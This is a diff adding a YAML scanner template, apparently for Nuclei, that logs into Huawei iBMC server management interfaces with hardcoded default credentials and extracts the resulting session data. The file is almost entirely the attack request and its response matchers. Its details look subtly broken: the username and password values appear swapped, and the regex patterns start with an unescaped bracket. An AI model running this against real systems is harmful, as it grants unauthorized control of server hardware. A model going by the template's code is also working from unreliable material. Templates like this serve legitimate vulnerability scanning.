@@ -1,0 +1,31 @@
+id: poc-yaml-huawei-ibmc-default-weak-pass
+info:
+  name: Huawei iBMC Default Weak Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password
+http:
+  - raw:
+      - |
+        POST /bmc/php/processparameter.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        check_pwd=root&logtype=0&user_name=Huawei12%23$&func=AddSession&IsKvmApp=0
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "[{ \"AddSession\":"
+        part: body
+      - type: word
+        words:
+          - "[{ %2522AddSession%2522:"
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "[{ %22AddSession%22:(.*?)}]"
+          - "[{ %2522AddSession%2522:(.*?)}]"
